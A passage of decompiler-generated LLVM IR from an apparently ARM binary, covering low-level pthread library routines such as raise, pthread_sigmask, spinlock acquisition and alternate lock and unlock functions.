  br i1 %v2_c6dc, label %dec_label_pc_c6f0, label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %.thread, %bb, %entry
  %v1_c6e4 = call i32 @__pthread_unlock(i32 %v5_c6a8)
  %v2_c6ec = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c6ec, i32* %r4.global-to-local, align 4
  ret i32 3

dec_label_pc_c6f0:                                ; preds = %bb
  %v1_c6f0 = add i32 %v3_c6c0, 20
  %v2_c6f0 = inttoptr i32 %v1_c6f0 to i32*
  %v3_c6f0 = load i32, i32* %v2_c6f0, align 4
  store i32 %v3_c6f0, i32* @r4, align 4
  %v1_c6f8 = call i32 @__pthread_unlock(i32 %v5_c6a8)
  %v0_c704 = call i32 @kill()
  %v7_c708 = icmp eq i32 %v0_c704, -1
  br i1 %v7_c708, label %bb9, label %bb8

bb8:                                              ; preds = %dec_label_pc_c6f0
  %v0_c70c = load i32, i32* %r6.global-to-local, align 4
  %v3_c710 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_c710, i32* %r4.global-to-local, align 4
  ret i32 %v0_c70c

bb9:                                              ; preds = %dec_label_pc_c6f0
  %v0_c714 = call i32 @__errno_location()
  %v1_c718 = inttoptr i32 %v0_c714 to i32*
  %v2_c718 = load i32, i32* %v1_c718, align 4
  %v2_c71c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c71c, i32* %r4.global-to-local, align 4
  ret i32 %v2_c718

; uselistorder directives
  uselistorder i32 %v3_c6d0, { 1, 0 }
  uselistorder i32 %v5_c6a8, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0, 2 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c724 = load i32, i32* @r4, align 4
  store i32 %v3_c724, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_c72c = call i32 @__GI_pthread_self()
  %v0_c730 = load i32, i32* @r4, align 4
  %v2_c734 = call i32 @pthread_kill(i32 %v0_c72c, i32 %v0_c730)
  store i32 %v2_c734, i32* %r4.global-to-local, align 4
  %v2_c738 = icmp eq i32 %v2_c734, 0
  br i1 %v2_c738, label %bb, label %bb3

bb:                                               ; preds = %entry
  %v3_c740 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_c740, i32* @r4, align 4
  ret i32 0

bb3:                                              ; preds = %entry
  %v0_c744 = call i32 @__errno_location()
  %v0_c748 = load i32, i32* %r4.global-to-local, align 4
  %v2_c748 = inttoptr i32 %v0_c744 to i32*
  store i32 %v0_c748, i32* %v2_c748, align 4
  %v2_c750 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c750, i32* @r4, align 4
  ret i32 -1
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-144 = alloca i32, align 4
  %v2_c758 = icmp eq i32 %arg2, 0
  %v2_c75c = ptrtoint i32* %stack_var_-144 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_c758, label %dec_label_pc_c7e0, label %dec_label_pc_c76c

dec_label_pc_c76c:                                ; preds = %entry
  store i32 %v2_c75c, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_c75c, i32* @r4, align 4
  %v0_c778 = call i32 @memcpy()
  %v0_c77c = load i32, i32* @r5, align 4
  %v7_c77c = icmp eq i32 %v0_c77c, 1
  br i1 %v7_c77c, label %dec_label_pc_c7cc, label %dec_label_pc_c784

dec_label_pc_c784:                                ; preds = %dec_label_pc_c76c
  %v7_c784 = icmp eq i32 %v0_c77c, 2
  br i1 %v7_c784, label %dec_label_pc_c798, label %dec_label_pc_c78c

dec_label_pc_c78c:                                ; preds = %dec_label_pc_c784
  %v2_c78c = icmp eq i32 %v0_c77c, 0
  br i1 %v2_c78c, label %dec_label_pc_c7a8, label %dec_label_pc_c7dc

dec_label_pc_c798:                                ; preds = %dec_label_pc_c784
  store i32 %v2_c75c, i32* @r0, align 4
  %v2_c7a0 = load i32, i32* @global_var_2b488.309, align 4
  %v2_c7a4 = call i32 @__GI_sigaddset(i32 %v2_c75c, i32 %v2_c7a0)
  br label %dec_label_pc_c7a8

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c78c, %dec_label_pc_c798
  store i32 %v2_c75c, i32* @r0, align 4
  %v1_c7b4 = call i32 @__GI_sigdelset(i32 %v2_c75c)
  %v2_c7bc = load i32, i32* @global_var_2b490.204, align 4
  %tmp11 = icmp slt i32 %v2_c7bc, 1
  br i1 %tmp11, label %dec_label_pc_c7dc, label %dec_label_pc_c7d4

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c76c
  br label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c7a8, %dec_label_pc_c7cc
  store i32 %v2_c75c, i32* @r0, align 4
  %v1_c7d8 = call i32 @__GI_sigdelset(i32 %v2_c75c)
  br label %dec_label_pc_c7dc

dec_label_pc_c7dc:                                ; preds = %dec_label_pc_c78c, %dec_label_pc_c7a8, %dec_label_pc_c7d4
  %v0_c7e0.pre = load i32, i32* @r5, align 4
  %v0_c7e8.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %entry, %dec_label_pc_c7dc
  %v0_c7e8 = phi i32 [ %arg3, %entry ], [ %v0_c7e8.pre, %dec_label_pc_c7dc ]
  %v0_c7e4 = phi %_TYPEDEF_sigset_t* [ null, %entry ], [ %phitmp, %dec_label_pc_c7dc ]
  %v0_c7e0 = phi i32 [ %arg1, %entry ], [ %v0_c7e0.pre, %dec_label_pc_c7dc ]
  %v4_c7ec = call i32 @__GI_sigprocmask(i32 %v0_c7e0, %_TYPEDEF_sigset_t* %v0_c7e4, i32 %v0_c7e8)
  %v3_c7f0 = icmp eq i32 %v4_c7ec, -1
  %v8_c7f0 = icmp eq i32 %v4_c7ec, -1
  br i1 %v8_c7f0, label %bb12, label %bb

bb:                                               ; preds = %dec_label_pc_c7e0
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_c7e0, %bb
  %v14_c8085 = phi i32 [ %v4_c7ec, %dec_label_pc_c7e0 ], [ 0, %bb ]
  br i1 %v3_c7f0, label %dec_label_pc_c7fc, label %dec_label_pc_c804

dec_label_pc_c7fc:                                ; preds = %bb12
  %v0_c7fc = call i32 @__errno_location()
  %v1_c800 = inttoptr i32 %v0_c7fc to i32*
  %v2_c800 = load i32, i32* %v1_c800, align 4
  br label %dec_label_pc_c804

dec_label_pc_c804:                                ; preds = %bb12, %dec_label_pc_c7fc
  %v14_c808 = phi i32 [ %v14_c8085, %bb12 ], [ %v2_c800, %dec_label_pc_c7fc ]
  ret i32 %v14_c808

; uselistorder directives
  uselistorder i32 %v4_c7ec, { 1, 0, 2 }
  uselistorder i32 %v2_c75c, { 5, 4, 1, 0, 3, 2, 6, 7 }
  uselistorder label %dec_label_pc_c804, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_c7e0, { 1, 0 }
  uselistorder label %dec_label_pc_c7dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c7d4, { 1, 0 }
  uselistorder label %dec_label_pc_c7a8, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_c820 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_c860

dec_label_pc_c844:                                ; preds = %dec_label_pc_c860
  %v0_c844 = call i32 @sched_yield()
  %v0_c830.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_c860

dec_label_pc_c84c:                                ; preds = %dec_label_pc_c860
  store i32 0, i32* %stack_var_-24, align 4
  %v0_c858 = call i32 @nanosleep()
  %v0_c85c = load i32, i32* @r4, align 4
  br label %dec_label_pc_c860

dec_label_pc_c860:                                ; preds = %dec_label_pc_c844, %dec_label_pc_c84c, %entry
  %v0_c83c = phi i32 [ 0, %entry ], [ %v0_c830.pr, %dec_label_pc_c844 ], [ %v0_c85c, %dec_label_pc_c84c ]
  store i32 0, i32* @r4, align 4
  store i32 %v2_c820, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v1_c83c = add i32 %v0_c83c, 1
  store i32 %v1_c83c, i32* @r5, align 4
  %v8_c840 = icmp sgt i32 %v0_c83c, 49
  br i1 %v8_c840, label %dec_label_pc_c84c, label %dec_label_pc_c844

; uselistorder directives
  uselistorder i32 %v0_c83c, { 1, 0 }
  uselistorder label %dec_label_pc_c860, { 1, 0, 2 }
}

define i32 @wait_node_free(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_c87c = load i32, i32* @r4, align 4
  store i32 %v3_c87c, i32* %stack_var_-12, align 4
  %v1_c88c = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_2be48.329 to i32))
  %v2_c894 = load i32, i32* @global_var_2be44.331, align 4
  %v0_c898 = load i32, i32* @r5, align 4
  store i32 %v0_c898, i32* @global_var_2be44.331, align 4
  %v2_c89c = inttoptr i32 %v0_c898 to i32*
  store i32 %v2_c894, i32* %v2_c89c, align 4
  %v1_c8a4 = load i32, i32* @r4, align 4
  %v2_c8a4 = inttoptr i32 %v1_c8a4 to i32*
  store i32 0, i32* %v2_c8a4, align 4
  %v2_c8a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c8a8, i32* @r4, align 4
  ret i32 %v1_c88c
}

define i32 @__pthread_lock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_c8b4 = add i32 %arg1, 4
  %v1_c8b8 = call i32 @__pthread_acquire(i32 %v1_c8b4)
  ret i32 %v1_c8b8
}

define i32 @_thread_self.2() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v2_c8c0 = load i32, i32* @global_var_2be4c.179, align 4
  %v0_c8c4 = load i32, i32* @sp, align 4
  %v3_c8c4 = icmp ult i32 %v0_c8c4, %v2_c8c0
  %v1_c8c8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_c8c8, i32* @r1, align 4
  br i1 %v3_c8c4, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_c8e4, %entry
  %merge = phi i32 [ ptrtoint (i32* @global_var_2b0c0 to i32), %entry ], [ ptrtoint (i32* @global_var_2b2a0.186 to i32), %dec_label_pc_c8e4 ]
  ret i32 %merge

bb3:                                              ; preds = %entry
  %v2_c8d8 = load i32, i32* @global_var_2be50.182, align 4
  %v3_c8dc = icmp ult i32 %v0_c8c4, %v2_c8d8
  br i1 %v3_c8dc, label %bb4, label %dec_label_pc_c8e4

dec_label_pc_c8e4:                                ; preds = %bb3
  %v2_c8e8 = load i32, i32* @global_var_2be54.184, align 4
  %v3_c8ec = icmp ult i32 %v0_c8c4, %v2_c8e8
  br i1 %v3_c8ec, label %bb, label %bb4

bb4:                                              ; preds = %dec_label_pc_c8e4, %bb3
  %v2_c8fc = load i32, i32* @global_var_30238.188, align 4
  %v3_c900 = and i32 %v1_c8c8, -2097152
  %v4_c900 = xor i32 %v3_c900, -2097152
  %v2_c908 = icmp eq i32 %v2_c8fc, 0
  %v1_c90c = sub i32 -477, %v4_c900
  br i1 %v2_c908, label %dec_label_pc_c918, label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %bb4
  %v1_c914 = call i32 @__pthread_find_self(i32 %v1_c90c)
  br label %dec_label_pc_c918

dec_label_pc_c918:                                ; preds = %bb4, %dec_label_pc_c914
  %v0_c918 = phi i32 [ %v1_c90c, %bb4 ], [ %v1_c914, %dec_label_pc_c914 ]
  %v1_c918 = add i32 %v0_c918, -3
  ret i32 %v1_c918

; uselistorder directives
  uselistorder i32 %v1_c90c, { 1, 0 }
  uselistorder label %dec_label_pc_c918, { 1, 0 }
}

define i32 @_suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_c938 = load i32, i32* @r0, align 4
  %v1_c938 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_c938)
  ret i32 %v1_c938
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v1_c940 = add i32 %tmp, 4
  %v2_c948 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v1_c954 = call i32 @__pthread_acquire(i32 %v1_c940)
  %v0_c958 = load i32, i32* @r5, align 4
  %v1_c958 = inttoptr i32 %v0_c958 to i32*
  %v2_c958 = load i32, i32* %v1_c958, align 4
  store i32 %v2_c958, i32* %r4.global-to-local, align 4
  %v2_c95c = icmp eq i32 %v2_c958, 0
  br i1 %v2_c95c, label %.thread3, label %dec_label_pc_c970

.thread3:                                         ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 1, i32* %v1_c958, align 4
  br label %dec_label_pc_c994

dec_label_pc_c970:                                ; preds = %entry
  %v0_c970 = load i32, i32* @r7, align 4
  %v2_c970 = icmp eq i32 %v0_c970, 0
  br i1 %v2_c970, label %dec_label_pc_c978, label %dec_label_pc_c980

dec_label_pc_c978:                                ; preds = %dec_label_pc_c970
  %v0_c978 = call i32 @_thread_self.2()
  store i32 %v0_c978, i32* %r7.global-to-local, align 4
  %v1_c984.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c970, %dec_label_pc_c978
  %v1_c984 = phi i32 [ %v0_c958, %dec_label_pc_c970 ], [ %v1_c984.pre, %dec_label_pc_c978 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c984 = inttoptr i32 %v1_c984 to i32*
  store i32 %v2_c948, i32* %v2_c984, align 4
  %v2_c98c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v2_c98c, i32* %stack_var_-32, align 4
  store i32 1, i32* @r2, align 4
  br label %dec_label_pc_c994

dec_label_pc_c994:                                ; preds = %.thread3, %dec_label_pc_c980
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_c998 = load i32, i32* @r6, align 4
  %v2_c998 = inttoptr i32 %v1_c998 to i32*
  store i32 0, i32* %v2_c998, align 4
  %v0_c99c = load i32, i32* @r2, align 4
  %v1_c99c = load i32, i32* %r3.global-to-local, align 4
  %v9_c99c = icmp eq i32 %v0_c99c, %v1_c99c
  store i1 %v9_c99c, i1* @cpsr_z, align 1
  %v0_c9a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 51624, i32* @lr, align 4
  %v1_c9a4 = xor i1 %v9_c99c, true
  call void @__pseudo_cond_branch(i1 %v1_c9a4, i32 ptrtoint (i32* @global_var_c938.338 to i32))
  ret i32 %v0_c9a0

; uselistorder directives
  uselistorder label %dec_label_pc_c994, { 1, 0 }
  uselistorder label %dec_label_pc_c980, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_c9b0 = load i32, i32* @r4, align 4
  store i32 %v3_c9b0, i32* %stack_var_-28, align 4
  %v1_c9c4 = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_2be48.329 to i32))
  store i32 ptrtoint (i32* @global_var_2be44.331 to i32), i32* %r2.global-to-local, align 4
  %v2_c9cc = load i32, i32* @global_var_2be44.331, align 4
  %v2_c9d0 = icmp eq i32 %v2_c9cc, 0
  store i32 %v2_c9cc, i32* @r6, align 4
  br i1 %v2_c9d0, label %dec_label_pc_c9f8.critedge, label %.thread2

.thread2:                                         ; preds = %entry
  %v2_c9d8 = inttoptr i32 %v2_c9cc to i32*
  %v3_c9d8 = load i32, i32* %v2_c9d8, align 4
  store i32 %v3_c9d8, i32* @global_var_2be44.331, align 4
  store i32 ptrtoint (i32* @global_var_2be48.329 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_2be48.329, align 4
  br label %dec_label_pc_ca1c

dec_label_pc_c9f8.critedge:                       ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2be48.329 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_2be48.329, align 4
  %v1_c9fc = call i32 @malloc(i32 12)
  %v2_ca00 = icmp eq i32 %v1_c9fc, 0
  br i1 %v2_ca00, label %dec_label_pc_ca08, label %dec_label_pc_ca1c

dec_label_pc_ca08:                                ; preds = %dec_label_pc_c9f8.critedge
  %v0_ca08 = load i32, i32* @r7, align 4
  %v0_ca0c = load i32, i32* @r8, align 4
  %v2_ca10 = inttoptr i32 %v0_ca08 to i32*
  %v3_ca10 = call i32 @__pthread_alt_lock(i32* %v2_ca10, i32 %v0_ca0c)
  %v2_ca18 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_ca18, i32* @r4, align 4
  ret i32 1

dec_label_pc_ca1c:                                ; preds = %.thread2, %dec_label_pc_c9f8.critedge
  %v0_ca1c = load i32, i32* @r7, align 4
  %v1_ca1c = add i32 %v0_ca1c, 4
  %v1_ca24 = call i32 @__pthread_acquire(i32 %v1_ca1c)
  %v0_ca28 = load i32, i32* @r7, align 4
  %v1_ca28 = inttoptr i32 %v0_ca28 to i32*
  %v2_ca28 = load i32, i32* %v1_ca28, align 4
  store i32 %v2_ca28, i32* @r4, align 4
  %v2_ca2c = icmp eq i32 %v2_ca28, 0
  br i1 %v2_ca2c, label %.thread6, label %dec_label_pc_ca40

.thread6:                                         ; preds = %dec_label_pc_ca1c
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_ca28, align 4
  br label %dec_label_pc_ca68

dec_label_pc_ca40:                                ; preds = %dec_label_pc_ca1c
  %v0_ca40 = load i32, i32* @r8, align 4
  %v2_ca40 = icmp eq i32 %v0_ca40, 0
  br i1 %v2_ca40, label %dec_label_pc_ca48, label %dec_label_pc_ca50

dec_label_pc_ca48:                                ; preds = %dec_label_pc_ca40
  %v0_ca48 = call i32 @_thread_self.2()
  store i32 %v0_ca48, i32* @r8, align 4
  br label %dec_label_pc_ca50

dec_label_pc_ca50:                                ; preds = %dec_label_pc_ca40, %dec_label_pc_ca48
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ca54 = load i32, i32* @r6, align 4
  %v2_ca54 = add i32 %v1_ca54, 8
  %v3_ca54 = inttoptr i32 %v2_ca54 to i32*
  store i32 0, i32* %v3_ca54, align 4
  %v0_ca58 = load i32, i32* @r4, align 4
  %v1_ca58 = load i32, i32* @r6, align 4
  %v2_ca58 = inttoptr i32 %v1_ca58 to i32*
  store i32 %v0_ca58, i32* %v2_ca58, align 4
  %v0_ca5c = load i32, i32* @r6, align 4
  %v1_ca5c = load i32, i32* @r7, align 4
  %v2_ca5c = inttoptr i32 %v1_ca5c to i32*
  store i32 %v0_ca5c, i32* %v2_ca5c, align 4
  %v0_ca60 = load i32, i32* @r8, align 4
  %v1_ca60 = load i32, i32* @r6, align 4
  %v2_ca60 = add i32 %v1_ca60, 4
  %v3_ca60 = inttoptr i32 %v2_ca60 to i32*
  store i32 %v0_ca60, i32* %v3_ca60, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ca68

dec_label_pc_ca68:                                ; preds = %.thread6, %dec_label_pc_ca50
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ca6c = load i32, i32* @r5, align 4
  %v2_ca6c = inttoptr i32 %v1_ca6c to i32*
  store i32 0, i32* %v2_ca6c, align 4
  %v0_ca70 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca70 = load i32, i32* %r3.global-to-local, align 4
  %v9_ca70 = icmp eq i32 %v0_ca70, %v1_ca70
  br i1 %v9_ca70, label %dec_label_pc_caa8, label %dec_label_pc_ca78

dec_label_pc_ca78:                                ; preds = %dec_label_pc_ca68
  %v0_ca78 = load i32, i32* @sl, align 4
  %v0_ca7c = load i32, i32* @r8, align 4
  %v2_ca80 = inttoptr i32 %v0_ca78 to i32*
  %v3_ca80 = call i32 @__pthread_timedsuspend_new(i32 %v0_ca7c, i32* %v2_ca80)
  %v2_ca84 = icmp eq i32 %v3_ca80, 0
  br i1 %v2_ca84, label %bb, label %dec_label_pc_caa8

bb:                                               ; preds = %dec_label_pc_ca78
  %v0_ca90 = load i32, i32* @r6, align 4
  %v1_ca90 = add i32 %v0_ca90, 8
  store i32 %v1_ca90, i32* %r3.global-to-local, align 4
  %v0_caa0 = load i32, i32* @r8, align 4
  store i32 %v0_caa0, i32* @r0, align 4
  %v1_caa4 = call i32 @_suspend(i32 %v0_caa0)
  br label %dec_label_pc_caa8

dec_label_pc_caa8:                                ; preds = %dec_label_pc_ca78, %dec_label_pc_ca68, %bb
  %v0_caa8 = load i32, i32* @r6, align 4
  %v1_caac = inttoptr i32 %v0_caa8 to i32*
  %v2_caac = call i32 @wait_node_free(i32* %v1_caac)
  %v2_cab4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_cab4, i32* @r4, align 4
  ret i32 1

; uselistorder directives
  uselistorder i32 %v2_c9cc, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r2.global-to-local, { 3, 2, 4, 1, 5, 6, 0 }
  uselistorder i32 ()* @_thread_self.2, { 1, 0 }
  uselistorder i32* @global_var_2be44.331, { 0, 2, 4, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_2be48.329 to i32), { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_caa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ca68, { 1, 0 }
  uselistorder label %dec_label_pc_ca50, { 1, 0 }
  uselistorder label %dec_label_pc_ca1c, { 1, 0 }
}

define i32 @__pthread_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_cac4 = add i32 %arg1, 4
  %v3_cac4 = inttoptr i32 %v2_cac4 to i32*
  store i32 0, i32* %v3_cac4, align 4
  %v0_cac8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_cac8
}

define i32 @__pthread_compare_and_swap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r0.global-to-local, align 4
  %v1_cae8 = call i32 @__pthread_acquire(i32 %arg4)
  store i32 %v1_cae8, i32* %r0.global-to-local, align 4
  %v0_caec = load i32, i32* @r6, align 4
  %v1_caec = inttoptr i32 %v0_caec to i32*
  %v2_caec = load i32, i32* %v1_caec, align 4
  %v1_caf0 = load i32, i32* @r4, align 4
  %v9_caf0 = icmp eq i32 %v2_caec, %v1_caf0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v9_caf0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_caf8 = load i32, i32* @r7, align 4
  store i32 %v1_caf8, i32* %v1_caec, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_cb04 = load i32, i32* @r5, align 4
  %v2_cb04 = inttoptr i32 %v1_cb04 to i32*
  store i32 0, i32* %v2_cb04, align 4
  %v17_cb08 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v17_cb08

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_cb0c = load i32, i32* @r4, align 4
  store i32 %v3_cb0c, i32* %stack_var_-28, align 4
  %v1_cb14 = add i32 %tmp, 4
  store i32 %v1_cb14, i32* %r0.global-to-local, align 4
  %v1_cb1c = call i32 @__pthread_acquire(i32 %v1_cb14)
  store i32 %v1_cb1c, i32* %r0.global-to-local, align 4
  %v0_cb20.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cb20

dec_label_pc_cb20:                                ; preds = %dec_label_pc_cba0, %dec_label_pc_cba8, %entry
  %v0_cb3c = phi i32 [ %v0_cb20.pre, %entry ], [ %v0_cb2017, %dec_label_pc_cba8 ], [ %v0_cb2017, %dec_label_pc_cba0 ]
  %v1_cb20 = inttoptr i32 %v0_cb3c to i32*
  %v2_cb20 = load i32, i32* %v1_cb20, align 4
  store i32 %v2_cb20, i32* %r0.global-to-local, align 4
  %v7_cb24 = icmp eq i32 %v2_cb20, 1
  store i1 %v7_cb24, i1* @cpsr_z, align 1
  %tmp37 = or i32 %v2_cb20, 1
  %tmp38 = icmp eq i32 %tmp37, 1
  br i1 %tmp38, label %dec_label_pc_cbc8, label %dec_label_pc_cb4c.preheader

dec_label_pc_cb4c.preheader:                      ; preds = %dec_label_pc_cb20
  store i32 -2147483648, i32* %sl.global-to-local, align 4
  store i32 %v0_cb3c, i32* @r4, align 4
  store i32 %v2_cb20, i32* @r5, align 4
  br label %dec_label_pc_cb4c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb4c.preheader, %dec_label_pc_cb70.backedge
  %v6_cb802 = phi i32 [ %v1_cb5c21, %dec_label_pc_cb70.backedge ], [ %v0_cb3c, %dec_label_pc_cb4c.preheader ]
  %v0_cb2018 = phi i32 [ %v0_cb2017, %dec_label_pc_cb70.backedge ], [ %v0_cb3c, %dec_label_pc_cb4c.preheader ]
  %v0_cb884 = phi i32 [ %v0_cb98, %dec_label_pc_cb70.backedge ], [ %v2_cb20, %dec_label_pc_cb4c.preheader ]
  %v1_cb4c = add i32 %v0_cb884, 8
  %v2_cb4c = inttoptr i32 %v1_cb4c to i32*
  %v3_cb4c = load i32, i32* %v2_cb4c, align 4
  %v2_cb50 = icmp eq i32 %v3_cb4c, 0
  br i1 %v2_cb50, label %dec_label_pc_cb74, label %dec_label_pc_cb58

dec_label_pc_cb58:                                ; preds = %dec_label_pc_cb4c
  %v1_cb58 = inttoptr i32 %v0_cb884 to i32*
  %v2_cb58 = load i32, i32* %v1_cb58, align 4
  %v2_cb5c = inttoptr i32 %v6_cb802 to i32*
  store i32 %v2_cb58, i32* %v2_cb5c, align 4
  %v2_cb60 = call i32 @wait_node_free(i32* %v1_cb58)
  store i32 %v2_cb60, i32* %r0.global-to-local, align 4
  %v0_cb64 = load i32, i32* @r4, align 4
  %v1_cb64 = load i32, i32* @r6, align 4
  %v1_cb68 = inttoptr i32 %v0_cb64 to i32*
  %v2_cb68 = load i32, i32* %v1_cb68, align 4
  store i32 %v2_cb68, i32* @r2, align 4
  br label %dec_label_pc_cb70.backedge

dec_label_pc_cb74:                                ; preds = %dec_label_pc_cb4c
  %v1_cb74 = add i32 %v0_cb884, 4
  %v2_cb74 = inttoptr i32 %v1_cb74 to i32*
  %v3_cb74 = load i32, i32* %v2_cb74, align 4
  %v1_cb78 = add i32 %v3_cb74, 24
  %v2_cb78 = inttoptr i32 %v1_cb78 to i32*
  %v3_cb78 = load i32, i32* %v2_cb78, align 4
  %v1_cb7c = load i32, i32* %sl.global-to-local, align 4
  %v5_cb80 = icmp slt i32 %v3_cb78, %v1_cb7c
  br i1 %v5_cb80, label %.thread3, label %bb

.thread3:                                         ; preds = %dec_label_pc_cb74
  store i32 %v0_cb884, i32* @r4, align 4
  %v1_cb8c5 = inttoptr i32 %v0_cb884 to i32*
  %v2_cb8c6 = load i32, i32* %v1_cb8c5, align 4
  store i32 %v2_cb8c6, i32* @r2, align 4
  br label %dec_label_pc_cb70.backedge

bb:                                               ; preds = %dec_label_pc_cb74
  store i32 %v0_cb884, i32* @r5, align 4
  store i32 %v0_cb884, i32* @r4, align 4
  %v1_cb8c = inttoptr i32 %v0_cb884 to i32*
  %v2_cb8c = load i32, i32* %v1_cb8c, align 4
  store i32 %v2_cb8c, i32* @r2, align 4
  store i32 %v3_cb78, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_cb70.backedge

dec_label_pc_cb70.backedge:                       ; preds = %bb, %dec_label_pc_cb58, %.thread3
  %v1_cb5c21 = phi i32 [ %v0_cb884, %.thread3 ], [ %v0_cb64, %dec_label_pc_cb58 ], [ %v0_cb884, %bb ]
  %v0_cb2017 = phi i32 [ %v0_cb2018, %.thread3 ], [ %v1_cb64, %dec_label_pc_cb58 ], [ %v0_cb2018, %bb ]
  %v0_cb98 = phi i32 [ %v2_cb8c6, %.thread3 ], [ %v2_cb68, %dec_label_pc_cb58 ], [ %v2_cb8c, %bb ]
  %v7_cb94 = icmp eq i32 %v0_cb98, 1
